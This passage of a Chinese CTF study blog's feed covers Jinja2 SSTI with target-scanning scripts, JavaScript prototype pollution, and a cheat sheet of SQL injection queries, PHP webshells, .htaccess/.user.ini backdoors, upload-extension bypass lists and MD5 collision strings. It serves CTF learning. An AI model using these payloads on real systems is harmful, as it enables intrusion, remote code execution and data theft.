title="文件读取"></a>文件读取</h4><p>python2——file类：</p><pre><code>&#123;&#123;[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()&#125;&#125;</code></pre><p>Python3——使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。首先编写脚本遍历目标Python环境中 <code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类索引号：</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"]&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;FileLoader&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")&#125;&#125;</code></pre><h4 id="内建函数-eval-执行命令"><a href="#内建函数-eval-执行命令" class="headerlink" title="内建函数 eval 执行命令"></a>内建函数 eval 执行命令</h4><ul><li>warnings.catch_warnings</li><li>WarningMessage</li><li>codecs.IncrementalEncoder</li><li>codecs.IncrementalDecoder</li><li>codecs.StreamReaderWriter</li><li>os._wrap_close</li><li>reprlib.Repr</li><li>weakref.finalize</li></ul><p>首先编写脚本遍历目标Python环境中含有内建函数 eval 的子类的索引号</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;eval&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')&#125;&#125;</code></pre><p>使用eval函数执行命令也是调用的os模块</p><p>Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;os.py&#39; in res.text:        print(i)</code></pre><p>随便挑一个类构造payload执行命令即可：</p><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()&#125;&#125;</code></pre><p>但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。</p><p>我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 <code>os._wrap_close</code>，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;popen&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()&#125;&#125;</code></pre><p>还有一些内容，这里就不搬过来了，可以自行查看<a href="https://xz.aliyun.com/t/9584#toc-0">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区 (aliyun.com)</a></p><p>这里还是找几个靶场检验一下</p><h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>题目源码：</p><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>现在看这个题就比较清晰了，waf了config和self，但flag放在了config中，如果没有黑名单的时候，我们可以传入 config，或者传入获取，这里还要再去查一下这个config：</p><p><a href="https://zhuanlan.zhihu.com/p/24055329">Flask项目配置（Configuration） - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/andy9468/p/10870574.html">flask的配置项及获取 - 安迪9468 - 博客园 (cnblogs.com)</a></p><p>从第二篇博客中我们发现可以使用current_app：</p><pre><code>&#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre><h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>在提示中我们知道需要获取一个cookie-secret的值，我们还需要补充一些知识：</p><p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入 - Hanamizuki花水木 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/bmjoker/p/13508538.html&quot;&gt;1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://taninluv.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>原型链污染</title>
    <link href="https://taninluv.github.io/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://taninluv.github.io/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2023-11-07T08:27:38.000Z</published>
    <updated>2023-11-07T09:02:07.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E6%A3%80%E6%9F%A5%E5%8E%9F%E5%9E%8B%EF%BC%9A%E6%9B%B4%E6%B7%B1%E5%85%A5%E7%9A%84%E7%A0%94%E7%A9%B6">继承与原型链 - JavaScript | MDN (mozilla.org)</a></p><p><a href="https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">JavaScript 原型链污染 | Drunkbaby’s Blog (drun1baby.top)</a></p><p>简单来说就是：</p><ul><li><code>prototype</code> 是 <code>newClass</code> 类的一个属性</li><li><code>newClass</code> 类实例化的对象 <code>newObj</code> 不能访问 <code>prototype</code>，但可以通过<code>.__proto__</code> 来访问 <code>newClass</code> 类的 <code>prototype</code></li><li><code>newClass</code> 实例化的对象 <code>newObj</code> 的 <code>.__proto__</code> 指向 <code>newClass</code> 类的 <code>prototype</code></li></ul><h3 id="哪些情况下原型链会被污染"><a href="#哪些情况下原型链会被污染" class="headerlink" title="哪些情况下原型链会被污染"></a>哪些情况下原型链会被污染</h3><p>找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象 merge</li><li>对象 clone（其实内核就是将待操作的对象 merge 到一个空对象中）</li></ul><h1 id="test"><a href="#test" class="headerlink" title="test:"></a>test:</h1><pre><code>function merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] = source[key]        &#125;    &#125;&#125;</code></pre><pre><code>let o1 = &#123;&#125;let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>这里<code>__proto__</code>已经代表o2的原型，并没有被当作key，故无法污染链子</p><pre><code>let o1 = &#123;&#125;let o2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>JSON 解析的情况下，<code>__proto__</code> 会被认为是一个真正的“键名”，而不代表“原型”,此时可以造成污染。</p><h1 id="CatCTF-2022-wife"><a href="#CatCTF-2022-wife" class="headerlink" title="CatCTF 2022 wife"></a>CatCTF 2022 wife</h1><pre><code>app.post(&#39;/register&#39;, (req, res) =&gt; &#123;    let user = JSON.parse(req.body)    if (!user.username || !user.password) &#123;        return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;)    &#125;    if (users.filter(u =&gt; u.username == user.username).length) &#123;        return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;)    &#125;    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123;        user.isAdmin = false        return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;)    &#125;    let newUser = Object.assign(&#123;&#125;, baseUser, user) //就是这里，原型链污染    users.push(newUser)    res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;)&#125;)</code></pre><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign">Object.assign() - JavaScript | MDN (mozilla.org)</a></p><p><strong><code>Object.assign()</code></strong> 静态方法将一个或者多个<em>源对象</em>中所有<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/propertyIsEnumerable">可枚举</a>的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn">自有属性</a>复制到<em>目标对象</em>，并返回修改后的目标对象。</p><p>正常情况下是无法污染的：</p><pre><code>baseUser = &#123;    a:1&#125;user = &#123;    a:2,    b:1,    __proto__:&#123;        c:3    &#125;&#125; // 这个函数的作用：浅复制一个对象，第一个参数位是对象的内容，后面的参数位是多个对象内容叠加进去，进行复制出一个全新的对象let newUser = Object.assign(&#123;&#125;, baseUser, user)  // 无污染，结果正常console.log(newUser)  // &#123;a: 2, b: 1&#125;  // 无污染，结果正常console.log(newUser.__proto__)  // &#123;constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …&#125;</code></pre><p>但是好在后端服务器是JavaScript，我们通过post发送过去的 json是字符串，JavaScript需要通过JSON.parse()函数才能把 json字符串转成对象，如之前所说，json解析时<code>__proto__</code>能被当成真正的key</p><h1 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h1><p>如果遇到过滤的话：</p><p>字符串 stringObject 的 replace() 方法执行的是查找并替换的操作。它将在 stringObject 中查找与 regexp 相匹配的子字符串，然后用 <em>replacement</em> 来替换这些子串。如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串。</p><p><em>replacement</em> 可以是字符串，也可以是函数。如果它是字符串，那么每个匹配都将由字符串替换。但是 replacement 中的 <code>$</code> 字符具有特定的含义。如下表所示，它说明从模式匹配得到的字符串将用于替换。</p><p><img src="https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/replace.png" alt="img"></p><pre><code>&#39;123&#39;.replace(&quot;2&quot;,&#39;$`&#39;);&quot;113&quot;&#39;123&#39;.replace(&quot;2&quot;,&quot;$&#39;&quot;);&quot;133&quot;</code></pre><p>这里先把匹配到的字符串替换为$`,然后由于$特殊含义，此时 $`又被替换为原位置的左侧文本，另一个同理</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原型链污染&quot;&gt;&lt;a href=&quot;#原型链污染&quot; class=&quot;headerlink&quot; title=&quot;原型链污染&quot;&gt;&lt;/a&gt;原型链污染&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/Java</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://taninluv.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF_Marks</title>
    <link href="https://taninluv.github.io/2023/11/01/CTF-Marks/"/>
    <id>https://taninluv.github.io/2023/11/01/CTF-Marks/</id>
    <published>2023-11-01T12:16:11.000Z</published>
    <updated>2024-08-30T09:46:59.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a href="https://blog.csdn.net/l2872253606/article/details/123362430">【精选】攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客</a></p><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>show databases</p><p>show tables</p><p>当纯数字字符串是表名的时候需要加反引号:</p><p>show columns from `1919810931114514`</p><p>反引号表示内容为表明</p><h2 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h2><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">【MySQL】MySQL 之 handler 的详细使用及说明_mysql handler-CSDN博客</a></p><h5 id="1、打开句柄"><a href="#1、打开句柄" class="headerlink" title="1、打开句柄"></a>1、打开句柄</h5><pre><code class="mysql">handler handler_table open;#这里可以使用别名</code></pre><h5 id="2、查看数据"><a href="#2、查看数据" class="headerlink" title="2、查看数据"></a>2、查看数据</h5><pre><code class="mysql">handler handler_table read first;handler handler_table read next;</code></pre><p>payload:</p><pre><code>1&#39;;use supersqli;handler `1919810931114514` open as p;handler p read first;</code></pre><h2 id="预编译绕过法"><a href="#预编译绕过法" class="headerlink" title="预编译绕过法"></a>预编译绕过法</h2><p><a href="https://blog.csdn.net/bb15070047748/article/details/107266400">什么是MySQL的预编译？_mysql 预编译-CSDN博客</a></p><pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct flag from `1919810931114514`;&#39;);#@表示变量prepare stmt from @sql;EXECUTE stmt;#</code></pre><p>感觉像是set设置变量值然后在语句中替换，使用concat绕过关键字过滤</p><h2 id="修改原查询法"><a href="#修改原查询法" class="headerlink" title="修改原查询法"></a>修改原查询法</h2><p>如果没有过滤alter，把默认展示的字段名字修改，把想看的字段名字、表明等修改为默认展示的名字</p><p>将放着flag的表1919810931114514名字改成words</p><p>alter table <code>1919810931114514</code> rename to words</p><p>表里头字段名flag改成id</p><p>alter table words change flag id varchar(100)</p><ul><li><p><code>ALTER TABLE words</code> 表示您要修改的表是名为 <code>words</code> 的表。</p></li><li><pre><code>CHANGE flag id varchar(100)</code></pre><p> 是实际的修改部分。它的含义是：</p><ul><li><code>CHANGE</code> 表示您要更改一个列的属性。</li><li><code>flag</code> 是要更改的列的当前名称。</li><li><code>id</code> 是要将该列更改为的新名称。</li><li><code>varchar(100)</code> 是新的数据类型，将该列更改为 VARCHAR 类型，最大长度为 100 个字符。</li></ul></li></ul><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul><li>strstr函数不区分大小写，所以我们可以改一下大小写来绕过strstr函数</li><li>过滤了union select，我们用union all select 就可以绕过</li></ul><h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p><a href="https://blog.csdn.net/m0_63525319/article/details/127982141">sql中的无关子查询与相关子查询和集合查询详细举例说明_无关子查询和相关子查询_ctf^_^的博客-CSDN博客</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311030020659.png" alt="image-20231103001841549"></p><p>相当于临时新建了一个a表，username字段放入admin，password字段放入123，用来绕过其后的验证：</p><pre><code>query (&quot;select username,password from &quot;.$this-&gt;table.&quot; where username=&#39;&quot;.$this-&gt;username.&quot;&#39; and password=&#39;&quot;.$this-&gt;password.&quot;&#39;&quot;);</code></pre><p>这里实际相当于注入了一个表</p><h2 id="非预期-load-file"><a href="#非预期-load-file" class="headerlink" title="非预期-load_file"></a>非预期-load_file</h2><pre><code>?no=-1 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+</code></pre><p>如果猜到路径，直接load_file读取</p><h1 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h1><p><a href="https://blog.csdn.net/yuanxu8877/article/details/128071631">【精选】攻防世界easyupload （web新手）_sean7777777的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/l2sec/p/12633109.html">XCTF bug - l2sec - 博客园 (cnblogs.com)</a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&lt;?= eval($_POST[1]);?&gt;&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;&lt;script language=&quot;php&quot;&gt; highlight_file(__FILE__);system($_GET[&#39;cmd&#39;]);&lt;script&gt;</code></pre><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><pre><code>&lt;FilesMatch &quot;shell&quot; &gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>将当前目录下文件名为shell的文件当成php来解析</p><pre><code>AddType application/x-httpd-php .mochu</code></pre><p>将别的后缀名文件内容解析为php程序</p><h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.<a href="https://so.csdn.net/so/search?q=ini%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">ini文件</a></h2><p>具体参考<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a></p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p>在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p><p>.user.ini</p><pre><code>auto_prepend_file=shell.jpg</code></pre><p>shell.jpg</p><pre><code>GIF89a&lt;?php eval($_P0ST[&#39;a&#39;]); ?&gt;</code></pre><h2 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h2><p>利用了一个Linux的目录结构特性 , 请看下面代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190907181102.png" alt="20190907181102.png"></p><p>这里访问 <code>./1.php/2.php/..</code> 代表访问 <code>2.php</code>的父目录 , 也就是访问 <code>1.php</code> 。</p><p>因此这里构造数据包时 , 可以构造如下POST数据</p><pre><code>con=&lt;?php @eval($_POST[cmd]);?&gt;&amp;file=test.php/1.php/..</code></pre><h3 id="后缀名"><a href="#后缀名" class="headerlink" title="后缀名"></a>后缀名</h3><pre><code>phpphp2php3php4php5pHppHp2pHp3pHp4pHp5htmlhtmphtmlphtHtmlHtmpHtmlaspaspxasaasaxashxasmxceraSpaSpxaSaaSaxaScxaShxaSmxcErjspjspajspxjswjxvjspfjtmlJSpjSpxjSpajSwjSvjSpfjHtmlasp/test.jpgasp;.jpgcer/test.jpgcer;.jpgasa/test.jpgasa;.jpgaSp/test.jpgaSp;.jpgcEr/test.jpgcEr;.jpgaSa/test.jpgaSa;.jpgjpg/xx.phpjpg/xx.pHpjpg/.phpjpg/.pHpphp.xs.aaphp2.aaphp3.aaphp4.aaphp5.aapHp.aapHp2.aapHp3.aapHp4.aaapHp5.aahtml.aahtm.aaphtml.aapht.aaaHtml.aaaHtm.aapHtml.aaphp::$DATA</code></pre><h2 id="访问写入fputs"><a href="#访问写入fputs" class="headerlink" title="访问写入fputs"></a>访问写入fputs</h2><p>from：攻防世界-web-wzsc :文件上传、条件竞争</p><pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#39;); ?&gt;</code></pre><h1 id="php相关"><a href="#php相关" class="headerlink" title="php相关"></a>php相关</h1><h2 id="RCE-变量动态调用函数"><a href="#RCE-变量动态调用函数" class="headerlink" title="RCE-变量动态调用函数"></a>RCE-变量动态调用函数</h2><p>[buuctf-<a href="https://blog.csdn.net/xhy18634297976/article/details/123148026">CISCN 2019 初赛]Love Math（小宇特详解）_小宇特详解的博客-CSDN博客</a></p><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’);</p><pre><code>$a=&#39;system&#39;;$a(&#39;cat/flag&#39;);payload:?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</code></pre><h3 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h3><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p><p><a href="https://coding.tools/cn/ascii-to-hex">ASCII字符串到16进制在线转换工具 - Coding.Tools</a></p><h3 id="base-convert-函数"><a href="#base-convert-函数" class="headerlink" title="base_convert()函数"></a>base_convert()函数</h3><p>base_convert()函数能够在任意进制之间转换数字</p><p>hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin</p><p>hex2bin&#x3D;base_convert(37907361743,10,36)</p><h3 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex()函数"></a>dechex()函数</h3><p>dechex()函数将10进制数转换为16进制的数</p><p><a href="https://www.sojson.com/hexconvert/16to10.html">十六进制转十进制| 16进制转10进制 | 在线进制转换工具 (sojson.com)</a></p><h2 id="RCE-preg-replace"><a href="#RCE-preg-replace" class="headerlink" title="RCE-preg_replace"></a>RCE-preg_replace</h2><p><a href="https://blog.csdn.net/giaogiao123/article/details/121217533">php代码审计之preg_replace函数_php preg_replace-CSDN博客</a></p><p>1.&#x2F;e修饰符必不可少<br>2.你必须让 subject 中有 pattern 的匹配。<br>3.可能跟php版本有关系,受用条件也只限于5.5到5.6的php版本<br>4.满足可变变量的条件</p><p>payload：</p><p>\S*&#x3D;${cmd}</p><p>直接传参\S*&#x3D;${@eval($_POST[‘cmd’])} 就可以蚁剑连接了</p><h2 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h2><p>?&#x2F;..&#x2F;flag &#x3D; &#x2F;..&#x2F;flag 这里的问号不会影响</p><h2 id="反序列化-POP-chains"><a href="#反序列化-POP-chains" class="headerlink" title="反序列化 POP chains"></a>反序列化 POP chains</h2><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231110111419036.png" alt="image-20231110111419036"></p><p><a href="https://blog.csdn.net/cosmoslin/article/details/120297881">【精选】php反序列化—POP 链的构造利用_反序列化pop链-CSDN博客</a></p><p><a href="https://www.php.net/manual/zh/function.popen.php">PHP: popen - Manual</a></p><pre><code>popen(string $command, string $mode): resource|false</code></pre><p>返回一个和 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 <a href="https://www.php.net/manual/zh/function.pclose.php">pclose()</a> 来关闭。此指针可以用于 <a href="https://www.php.net/manual/zh/function.fgets.php">fgets()</a>，<a href="https://www.php.net/manual/zh/function.fgetss.php">fgetss()</a> 和 <a href="https://www.php.net/manual/zh/function.fwrite.php">fwrite()</a>。 当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。</p><pre><code>&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt;</code></pre><p><a href="https://www.cnblogs.com/gaohj/p/3267692.html">PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec() - gaohj - 博客园 (cnblogs.com)</a></p><pre><code>function passthru(string $command,int[optional] $return_value)</code></pre><p>passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p><pre><code>&lt;?php        passthru(&quot;ls&quot;);?&gt;</code></pre><h2 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h2><p><a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHP反序列化中wakeup()绕过总结 – fushulingのblog</a></p><blockquote><p>可以利用cve-2016-7124进行绕过，将payload里ctf后面那个1改为2就行了，因为真实的属性其实只有一个，那就是那个flag，改为2之后对象属性个数的值就大于真实的属性个数了，因此可以绕过wakeup()，</p></blockquote><h3 id="非public属性"><a href="#非public属性" class="headerlink" title="非public属性"></a>非public属性</h3><p>[BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112591542">极客大挑战 2019]PHP 1_buuojphp1-CSDN博客</a></p><p>区别只在于对变量名添加了标记：</p><pre><code>public无标记，变量名不变，长度不变: s:2:&quot;op&quot;;i:2;protected在变量名前添加标记%00*%00，长度+3: s:5:&quot;%00*%00op&quot;;i:2;private在变量名前添加标记%00(classname)%00，长度+2+类名长度: s:17:&quot;%00FileHandler_Z%00op&quot;;i:2;</code></pre><p>O:6:”class1”:3:{s:1:”a”;s:1:”1”;s:4:”<em>b”;s:5:”ThisB”;s:9:”class1c”;s:5:”ThisC”;}</em><br><em>对象序列化后的结构为：</em><br><em>O:对象名的长度:”对象名”:对象属性个数:{s:属性名的长度:”属性名”;s:属性值的长度:”属性值”;}a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。b是protected类型的变量，它的变量名长度为4，也就是b前添加了%00</em>%00。所以，protected属性的表示方式是在变量名前加上%00*%00。c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。虽然Test类中有test1方法，但是，序列化得到的字符串中，只保存了公有变量a，保护变量b和私有变量c，并没保存类中的方法。也可以看出，序列化不保存方法。</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>这里提供一些md5以后是0e开头的值：</p><pre><code>QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020</code></pre><p>强碰撞：</p><pre><code>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</code></pre><pre><code>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><h2 